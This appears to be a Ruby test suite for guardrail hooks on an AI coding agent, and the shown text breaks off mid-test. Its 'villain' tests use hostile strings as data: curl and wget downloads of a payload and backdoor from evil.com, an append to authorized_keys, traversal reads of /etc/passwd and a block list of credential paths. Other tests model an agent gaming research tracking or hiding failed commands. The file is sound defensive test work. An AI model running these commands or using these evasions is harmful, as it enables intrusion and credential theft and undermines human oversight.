#!/usr/bin/env ruby
# frozen_string_literal: true

# Tier Tests: Easy, Hard, Villain
# Tests ACTUAL hook behavior, not just helper functions
#
# Run: ruby scripts/hooks/test/tier_tests.rb

require 'json'
require 'open3'
require 'fileutils'

HOOKS_DIR = File.expand_path('..', __dir__)
PROJECT_DIR = File.expand_path('../..', HOOKS_DIR)

# === TEST FRAMEWORK ===

class TierTest
  PASS = '✅'
  FAIL = '❌'
  SKIP = '⏭️'

  attr_reader :passed, :failed, :skipped, :results

  def initialize(hook_name)
    @hook_name = hook_name
    @passed = 0
    @failed = 0
    @skipped = 0
    @results = { easy: [], hard: [], villain: [] }
  end

  def run_hook(stdin_data, env = {})
    hook_path = File.join(HOOKS_DIR, "#{@hook_name}.rb")
    env_with_defaults = {
      'CLAUDE_PROJECT_DIR' => PROJECT_DIR,
      'TIER_TEST_MODE' => 'true'  # Hooks can detect test mode
    }.merge(env)

    stdout, stderr, status = Open3.capture3(
      env_with_defaults,
      'ruby', hook_path,
      stdin_data: stdin_data.to_json
    )

    {
      stdout: stdout,
      stderr: stderr,
      exit_code: status.exitstatus,
      output: stdout + stderr
    }
  end

  def test(tier, name, expected_exit: nil, expected_output: nil, skip: false)
    if skip
      @skipped += 1
      @results[tier] << { name: name, status: :skipped, reason: 'Marked skip' }
      warn "  #{SKIP} #{name} (skipped)"
      return
    end

    result = yield

    passed = true
    failure_reason = nil

    if expected_exit && result[:exit_code] != expected_exit
      passed = false
      failure_reason = "Expected exit #{expected_exit}, got #{result[:exit_code]}"
    end

    if expected_output && !result[:output].include?(expected_output)
      passed = false
      failure_reason = "Expected output containing '#{expected_output}'"
    end

    if passed
      @passed += 1
      @results[tier] << { name: name, status: :passed }
      warn "  #{PASS} #{name}"
    else
      @failed += 1
      @results[tier] << { name: name, status: :failed, reason: failure_reason }
      warn "  #{FAIL} #{name}"
      warn "      #{failure_reason}" if failure_reason
    end
  end

  def summary
    easy = @results[:easy].count { |r| r[:status] == :passed }
    hard = @results[:hard].count { |r| r[:status] == :passed }
    villain = @results[:villain].count { |r| r[:status] == :passed }

    easy_total = @results[:easy].length
    hard_total = @results[:hard].length
    villain_total = @results[:villain].length

    {
      hook: @hook_name,
      passed: @passed,
      failed: @failed,
      skipped: @skipped,
      total: @passed + @failed + @skipped,
      by_tier: {
        easy: "#{easy}/#{easy_total}",
        hard: "#{hard}/#{hard_total}",
        villain: "#{villain}/#{villain_total}"
      }
    }
  end
end

# === SANEPROMPT TESTS ===

def test_saneprompt
  t = TierTest.new('saneprompt')
  warn "\n=== SANEPROMPT TESTS ==="

  # --- EASY TIER (20 tests) ---
  warn "\n  [EASY] Basic classification"

  # Passthrough tests (12)
  %w[y yes Y Yes n no ok OK /commit /help 123 done].each do |input|
    t.test(:easy, "passthrough: '#{input}'", expected_exit: 0) do
      t.run_hook({ 'prompt' => input })
    end
  end

  # Question tests (8)
  [
    'what does this do?',
    'how does it work?',
    'is this correct?',
    'can you explain?',
    'why is this failing?',
    'where is the config?',
    'when was this added?',
    'who wrote this code?'
  ].each do |input|
    t.test(:easy, "question: '#{input[0..30]}'", expected_exit: 0) do
      t.run_hook({ 'prompt' => input })
    end
  end

  # --- HARD TIER (20 tests) ---
  warn "\n  [HARD] Edge cases and ambiguity"

  # Ambiguous - should be big_task (4)
  t.test(:hard, "big_task: 'fix everything in the module'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'fix everything in the module' })
  end

  t.test(:hard, "big_task: 'refactor the whole thing'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'refactor the whole thing' })
  end

  t.test(:hard, "big_task: 'rewrite entire system'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'rewrite entire system' })
  end

  t.test(:hard, "big_task: 'overhaul all tests'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'overhaul all tests' })
  end

  # Mixed patterns - question despite fix keyword (2)
  t.test(:hard, "question despite 'fix': 'quick question about the fix'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'quick question about the fix' })
  end

  t.test(:hard, "question despite 'update': 'what was the update?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'what was the update?' })
  end

  # Edge case - question mark but action (2)
  t.test(:hard, "task despite '?': 'can you fix this?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'can you fix this?' })
  end

  t.test(:hard, "task despite '?': 'would you update the file?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'would you update the file?' })
  end

  # Frustration detection (4)
  t.test(:hard, "frustration: 'no, I meant fix it differently'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'no, I meant fix it differently' })
  end

  t.test(:hard, "frustration: 'I already said fix the login'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'I already said fix the login' })
  end

  t.test(:hard, "frustration: 'JUST FIX IT ALREADY'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'JUST FIX IT ALREADY' })
  end

  t.test(:hard, "frustration: 'this is wrong again'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'this is wrong again' })
  end

  # Trigger detection (4)
  %w[quick just simple minor].each do |trigger|
    t.test(:hard, "trigger detected: '#{trigger} fix'", expected_exit: 0) do
      t.run_hook({ 'prompt' => "#{trigger} fix for the button" })
    end
  end

  # Multiple triggers (2)
  t.test(:hard, "multi-trigger: 'just add a quick simple fix'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'just add a quick simple fix' })
  end

  t.test(:hard, "multi-trigger: 'tiny quick minor update'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'tiny quick minor update' })
  end

  # Short prompts and edge cases (4)
  t.test(:hard, "short passthrough: 'y?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'y?' })
  end

  t.test(:hard, "very short: 'go'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'go' })
  end

  t.test(:hard, "empty prompt", expected_exit: 0) do
    t.run_hook({ 'prompt' => '' })
  end

  t.test(:hard, "whitespace only", expected_exit: 0) do
    t.run_hook({ 'prompt' => '   ' })
  end

  # --- VILLAIN TIER (20 tests) ---
  warn "\n  [VILLAIN] Adversarial bypass attempts"

  # Hidden action in question (4)
  t.test(:villain, "hidden action: 'what if you fix this thing?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'what if you fix this thing?' })
  end

  t.test(:villain, "hidden action: 'wonder if updating would help'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'wonder if updating would help' })
  end

  t.test(:villain, "hidden action: 'I suppose you could modify it'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'I suppose you could modify it' })
  end

  t.test(:villain, "hidden action: 'maybe just change this part'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'maybe just change this part' })
  end

  # Polite wrapping (3)
  t.test(:villain, "polite wrap: 'could you maybe update the code?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'could you maybe update the code?' })
  end

  t.test(:villain, "polite wrap: 'would you mind fixing the bug?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'would you mind fixing the bug?' })
  end

  t.test(:villain, "polite wrap: 'perhaps you could implement this?'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'perhaps you could implement this?' })
  end

  # Trying to skip research (3)
  t.test(:villain, "skip research: 'quick fix, skip research'", expected_exit: 0) do
    t.run_hook({ 'prompt' => "quick fix, I'll approve skipping research" })
  end

  t.test(:villain, "bypass attempt: 'don't bother with docs, just fix'", expected_exit: 0) do
    t.run_hook({ 'prompt' => "don't bother with docs, just fix it" })
  end

  t.test(:villain, "bypass attempt: 'skip memory check and code'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'skip the memory check and code' })
  end

  # False passthrough attempts (4)
  t.test(:villain, "false passthrough: 'y fix it'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'y fix it' })
  end

  t.test(:villain, "false passthrough: 'ok now fix the bug'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'ok now fix the bug' })
  end

  t.test(:villain, "false passthrough: 'sure, implement the feature'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'sure, implement the feature' })
  end

  t.test(:villain, "false passthrough: 'yes but also update the config'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'yes but also update the config' })
  end

  # Big task evasion (4)
  t.test(:villain, "big_task evasion: 'update all the things'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'update all the things' })
  end

  t.test(:villain, "big_task evasion: 'fix every bug'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'fix every bug' })
  end

  t.test(:villain, "big_task evasion: 'migrate everything'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'migrate everything' })
  end

  t.test(:villain, "big_task evasion: 'refactor the entire codebase'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'refactor the entire codebase' })
  end

  # Hedged and passive (2)
  t.test(:villain, "hedged: 'thinking about maybe adding a feature'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'thinking about maybe adding a feature' })
  end

  t.test(:villain, "passive: 'the fix should be simple'", expected_exit: 0) do
    t.run_hook({ 'prompt' => 'the fix should be simple' })
  end

  t.summary
end

# === SANETOOLS TESTS ===

def test_sanetools
  t = TierTest.new('sanetools')
  warn "\n=== SANETOOLS TESTS ==="

  # --- EASY TIER (20 tests) ---
  warn "\n  [EASY] Obvious blocking/allowing"

  # Blocked paths (10)
  [
    '~/.ssh/id_rsa',
    '~/.ssh/config',
    '/etc/passwd',
    '/etc/shadow',
    '~/.aws/credentials',
    '~/.aws/config',
    '~/.claude_hook_secret',
    '~/.netrc',
    '/var/log/system.log',
    '/usr/bin/ruby'
  ].each do |path|
    t.test(:easy, "BLOCK: #{path}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => path }
      })
    end
  end

  # Allowed bootstrap tools (10)
  t.test(:easy, "ALLOW: Read (bootstrap)", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' }
    })
  end

  t.test(:easy, "ALLOW: Grep (bootstrap)", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'test' }
    })
  end

  t.test(:easy, "ALLOW: Glob (bootstrap)", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Glob',
      'tool_input' => { 'pattern' => '*.rb' }
    })
  end

  t.test(:easy, "ALLOW: memory MCP read", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__memory__read_graph',
      'tool_input' => {}
    })
  end

  t.test(:easy, "ALLOW: memory MCP search", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__memory__search_nodes',
      'tool_input' => { 'query' => 'test' }
    })
  end

  t.test(:easy, "ALLOW: Task agent", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'search for patterns' }
    })
  end

  t.test(:easy, "ALLOW: WebSearch", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'swift patterns' }
    })
  end

  t.test(:easy, "ALLOW: WebFetch", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'WebFetch',
      'tool_input' => { 'url' => 'https://example.com' }
    })
  end

  t.test(:easy, "ALLOW: apple-docs MCP", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__apple-docs__search_apple_docs',
      'tool_input' => { 'query' => 'SwiftUI' }
    })
  end

  t.test(:easy, "ALLOW: context7 MCP", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__context7__query-docs',
      'tool_input' => { 'libraryId' => '/test/lib', 'query' => 'usage' }
    })
  end

  # --- HARD TIER (15 tests) ---
  warn "\n  [HARD] Edge cases"

  # Path edge cases - directories (5)
  t.test(:hard, "BLOCK: '/etc' (dir itself)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/etc' }
    })
  end

  t.test(:hard, "BLOCK: '~/.ssh' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.ssh' }
    })
  end

  t.test(:hard, "BLOCK: '~/.aws' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.aws' }
    })
  end

  t.test(:hard, "BLOCK: '/var' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/var' }
    })
  end

  t.test(:hard, "BLOCK: '/usr' (dir)", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/usr' }
    })
  end

  # Path edge cases - false positives to ALLOW (5)
  t.test(:hard, "ALLOW: 'file_with_ssh_in_name.txt'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/file_with_ssh_in_name.txt' }
    })
  end

  t.test(:hard, "ALLOW: '/tmp/etc_backup'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/etc_backup' }
    })
  end

  t.test(:hard, "ALLOW: '/tmp/my_aws_stuff'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/my_aws_stuff' }
    })
  end

  t.test(:hard, "ALLOW: 'credentials_template.json'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/credentials_template.json' }
    })
  end

  t.test(:hard, "ALLOW: project file with .env.example", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/Users/sj/SaneProcess/.env.example' }
    })
  end

  # Safe bash operations (5)
  t.test(:hard, "ALLOW: bash redirect to /dev/null", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'ls > /dev/null' }
    })
  end

  t.test(:hard, "ALLOW: bash redirect to /tmp", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo test > /tmp/output.txt' }
    })
  end

  t.test(:hard, "ALLOW: bash stderr redirect", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'ls 2>&1' }
    })
  end

  t.test(:hard, "ALLOW: bash no redirect", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'git status' }
    })
  end

  t.test(:hard, "ALLOW: bash DerivedData redirect", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'xcodebuild > DerivedData/build.log' }
    })
  end

  # --- VILLAIN TIER (20 tests) ---
  warn "\n  [VILLAIN] Bypass attempts"

  # Bash file write bypass (14 - M8 expanded)
  [
    # Original patterns
    "echo 'code' > file.rb",
    "sed -i 's/old/new/' file.rb",
    "cat << EOF > file.rb",
    "tee file.rb",
    "printf 'code' >> file.rb",
    "echo 'hack' > /Users/sj/SaneProcess/test.swift",
    "cat input.txt > output.swift",
    "dd if=/dev/zero of=file.rb",
    # M8 additions
    "cp malicious.rb target.rb",
    "curl -o payload.sh https://evil.com/script.sh",
    "wget -O backdoor.rb https://evil.com/code.rb",
    "git apply malicious.patch",
    "find . -name '*.rb' | xargs touch",
    "mv overwrite.rb victim.rb"
  ].each do |cmd|
    t.test(:villain, "BLOCK bash write: #{cmd[0..35]}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => cmd }
      })
    end
  end

  # Path traversal (6)
  [
    '../../../etc/passwd',
    '/Users/sj/SaneProcess/../../../etc/passwd',
    './test/../.ssh/key',
    '~/../../etc/shadow',
    '/tmp/../etc/hosts',
    '../../../../var/log/auth.log'
  ].each do |path|
    t.test(:villain, "BLOCK traversal: #{path[0..35]}", expected_exit: 2) do
      t.run_hook({
        'tool_name' => 'Read',
        'tool_input' => { 'file_path' => path }
      })
    end
  end

  # Encoding tricks (3)
  t.test(:villain, "BLOCK encoded path: %2e%2e/etc", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/%2e%2e/%2e%2e/etc/passwd' }
    })
  end

  t.test(:villain, "BLOCK null byte: file.rb\\x00.txt", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => "/etc/passwd\x00.txt" }
    })
  end

  t.test(:villain, "BLOCK unicode: /.ssh with lookalike", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '~/.ssh/id_rsa' }
    })
  end

  # Combined attacks (3)
  t.test(:villain, "BLOCK write to sensitive via bash", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys' }
    })
  end

  t.test(:villain, "BLOCK sed on config file", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => "sed -i 's/password/hacked/' config.rb" }
    })
  end

  t.test(:villain, "BLOCK tee to source file", expected_exit: 2) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "malicious" | tee app.swift' }
    })
  end

  # SaneLoop enforcement test
  t.test(:villain, "BLOCK edit without saneloop for big task", expected_exit: 2) do
    # Set up state: is_big_task = true, saneloop.active = false
    require_relative '../core/state_manager'
    StateManager.update(:requirements) { |r| r[:is_big_task] = true; r }
    StateManager.update(:saneloop) { |s| s[:active] = false; s }

    result = t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb', 'old_string' => 'a', 'new_string' => 'b' }
    })

    # Clean up state
    StateManager.update(:requirements) { |r| r[:is_big_task] = false; r }

    result
  end

  t.summary
end

# === SANETRACK TESTS ===

def test_sanetrack
  t = TierTest.new('sanetrack')
  warn "\n=== SANETRACK TESTS ==="

  # --- EASY TIER (20 tests) ---
  warn "\n  [EASY] Basic tracking"

  # Research category detection (10)
  t.test(:easy, "tracks memory: mcp__memory__read_graph", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__memory__read_graph',
      'tool_input' => {},
      'tool_result' => { 'entities' => [] }
    })
  end

  t.test(:easy, "tracks memory: mcp__memory__search_nodes", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__memory__search_nodes',
      'tool_input' => { 'query' => 'bug' },
      'tool_result' => { 'entities' => [] }
    })
  end

  t.test(:easy, "tracks local: Read", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'file content here'
    })
  end

  t.test(:easy, "tracks local: Grep", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'test' },
      'tool_result' => 'test.rb:50: match'
    })
  end

  t.test(:easy, "tracks local: Glob", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Glob',
      'tool_input' => { 'pattern' => '*.swift' },
      'tool_result' => ['file1.swift', 'file2.swift']
    })
  end

  t.test(:easy, "tracks web: WebSearch", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'test' },
      'tool_result' => 'search results'
    })
  end

  t.test(:easy, "tracks web: WebFetch", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'WebFetch',
      'tool_input' => { 'url' => 'https://example.com' },
      'tool_result' => 'page content'
    })
  end

  t.test(:easy, "tracks docs: apple-docs MCP", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__apple-docs__search_apple_docs',
      'tool_input' => { 'query' => 'SwiftUI' },
      'tool_result' => 'documentation'
    })
  end

  t.test(:easy, "tracks docs: context7 MCP", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__context7__query-docs',
      'tool_input' => { 'libraryId' => '/test', 'query' => 'api' },
      'tool_result' => 'documentation'
    })
  end

  t.test(:easy, "tracks github: mcp__github__*", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__github__search_repositories',
      'tool_input' => { 'query' => 'test' },
      'tool_result' => 'repositories'
    })
  end

  # Failure detection (5)
  t.test(:easy, "detects Bash failure (exit 1)", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'false' },
      'tool_result' => '',
      'is_error' => true
    })
  end

  t.test(:easy, "detects success (exit 0)", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'true' },
      'tool_result' => ''
    })
  end

  t.test(:easy, "detects Edit success", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb' },
      'tool_result' => 'File edited'
    })
  end

  t.test(:easy, "detects Read success", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'contents'
    })
  end

  t.test(:easy, "tracks Task agent", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'search codebase' },
      'tool_result' => 'found patterns'
    })
  end

  # --- HARD TIER (20 tests) ---
  warn "\n  [HARD] Edge cases"

  # Error signature normalization (10)
  [
    { input: 'bash: foo: command not found', sig: 'COMMAND_NOT_FOUND' },
    { input: 'error: unable to access', sig: 'ACCESS_DENIED' },
    { input: 'No such file or directory', sig: 'FILE_NOT_FOUND' },
    { input: 'TypeError: undefined', sig: 'TYPE_ERROR' },
    { input: 'SyntaxError: unexpected', sig: 'SYNTAX_ERROR' },
    { input: 'Permission denied', sig: 'PERMISSION_DENIED' },
    { input: 'Connection refused', sig: 'CONNECTION_ERROR' },
    { input: 'Timeout waiting for', sig: 'TIMEOUT' },
    { input: 'fatal: not a git repository', sig: 'GIT_ERROR' },
    { input: 'Build failed with exit code 1', sig: 'BUILD_FAILED' }
  ].each do |tc|
    t.test(:hard, "error signature: #{tc[:sig]}", expected_exit: 0) do
      t.run_hook({
        'tool_name' => 'Bash',
        'tool_input' => { 'command' => 'test' },
        'tool_result' => tc[:input],
        'is_error' => true
      })
    end
  end

  # False positive avoidance (5)
  t.test(:hard, "NOT failure: Read file containing 'error'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'This file contains the word error but is not a failure'
    })
  end

  t.test(:hard, "NOT failure: Grep for 'fail'", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'fail' },
      'tool_result' => 'failure_handler.rb:50'
    })
  end

  t.test(:hard, "NOT failure: Read crash log", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/crash.log' },
      'tool_result' => 'Exception: NullPointerException at line 50'
    })
  end

  t.test(:hard, "NOT failure: Grep error patterns", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'command not found' },
      'tool_result' => 'docs/errors.md:50: handle command not found'
    })
  end

  t.test(:hard, "NOT failure: file has exit code in content", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/test.txt' },
      'tool_result' => 'exit code 1 means failure'
    })
  end

  # Circuit breaker edge cases (5)
  t.test(:hard, "circuit breaker: 1 failure", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test' },
      'tool_result' => 'command not found',
      'is_error' => true
    })
  end

  t.test(:hard, "circuit breaker: 2 failures", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test2' },
      'tool_result' => 'command not found',
      'is_error' => true
    })
  end

  t.test(:hard, "circuit breaker: success resets", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'ls' },
      'tool_result' => 'file1 file2'
    })
  end

  t.test(:hard, "circuit breaker: mixed errors", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test' },
      'tool_result' => 'Permission denied',
      'is_error' => true
    })
  end

  # M9 Tautology detection tests - verify warnings fire (exit 0 with stderr)
  # Note: Tautology detection produces warnings, doesn't block
  t.test(:hard, "tautology: self-comparison x == x", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(value == value)'
      }
    })
  end

  t.test(:hard, "tautology: count >= 0 always true", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(array.count >= 0)'
      }
    })
  end

  t.test(:hard, "tautology: empty assertion", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect()'
      }
    })
  end

  t.test(:hard, "tautology: XCTAssertEqual self", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => 'XCTAssertEqual(result, result)'
      }
    })
  end

  t.test(:hard, "NOT tautology: valid assertion", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => {
        'file_path' => '/tmp/MyTests.swift',
        'new_string' => '#expect(result.count == 3)'
      }
    })
  end

  t.test(:hard, "Task agent: no result tracking", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'find files' },
      'tool_result' => nil
    })
  end

  # --- VILLAIN TIER (15 tests) ---
  warn "\n  [VILLAIN] Gaming attempts"

  # Hidden errors in success (3)
  t.test(:villain, "hidden error: success with error text", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'echo "Error: something failed" && exit 0' },
      'tool_result' => 'Error: something failed',
      'is_error' => false
    })
  end

  t.test(:villain, "hidden error: partial success", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'command 2>/dev/null; exit 0' },
      'tool_result' => '',
      'is_error' => false
    })
  end

  t.test(:villain, "hidden error: ignored exit code", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'false || true' },
      'tool_result' => '',
      'is_error' => false
    })
  end

  # Empty/meaningless research (5)
  t.test(:villain, "empty research: Read empty file", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/empty.txt' },
      'tool_result' => ''
    })
  end

  t.test(:villain, "empty research: Grep no matches", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Grep',
      'tool_input' => { 'pattern' => 'nonexistent' },
      'tool_result' => ''
    })
  end

  t.test(:villain, "empty research: WebSearch no results", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'WebSearch',
      'tool_input' => { 'query' => 'asdfqwerzxcv1234' },
      'tool_result' => 'No results found'
    })
  end

  t.test(:villain, "empty research: memory empty graph", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'mcp__memory__read_graph',
      'tool_input' => {},
      'tool_result' => { 'entities' => [], 'relations' => [] }
    })
  end

  t.test(:villain, "empty research: Task no output", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'search for nonexistent' },
      'tool_result' => 'No results found'
    })
  end

  # Gaming research tracking (4)
  t.test(:villain, "repeated same research", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/same.txt' },
      'tool_result' => 'same content'
    })
  end

  t.test(:villain, "research after edit started", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/late.txt' },
      'tool_result' => 'late research'
    })
  end

  t.test(:villain, "claim Task did research", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Task',
      'tool_input' => { 'prompt' => 'I already researched this' },
      'tool_result' => 'claim: research done'
    })
  end

  t.test(:villain, "fast research timing", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Read',
      'tool_input' => { 'file_path' => '/tmp/fast.txt' },
      'tool_result' => 'fast'
    })
  end

  # Manipulating tracking (3)
  t.test(:villain, "success despite error in output", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'npm test' },
      'tool_result' => 'FAIL src/test.js',
      'is_error' => false
    })
  end

  t.test(:villain, "Edit claimed success but failed", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Edit',
      'tool_input' => { 'file_path' => '/tmp/test.rb' },
      'tool_result' => 'Edit conflict: file changed',
      'is_error' => true
    })
  end

  t.test(:villain, "multiple errors same signature", expected_exit: 0) do
    t.run_hook({
      'tool_name' => 'Bash',
      'tool_input' => { 'command' => 'test3' },
      'tool_result' => 'command not found',
      'is_error' => true
    })
  end

  t.summary
end

# === SANESTOP TESTS ===

def test_sanestop
  t = TierTest.new('sanestop')
  warn "\n=== SANESTOP TESTS ==="

  # --- EASY TIER (20 tests) ---
  warn "\n  [EASY] Valid session operations"

  # Basic session operations (10)
  t.test(:easy, "allow stop with 0 edits", expected_exit: 0) do
    t.run_hook({
      'stop_hook_active' => true,
      'edit_count' => 0
    })
  end

  t.test(:easy, "valid session end", expected_exit: 0) do
    t.run_hook({
      'session_id' => 'test-123'
    })
  end

  t.test(:easy, "track session start", expected_exit: 0) do
    t.run_hook({
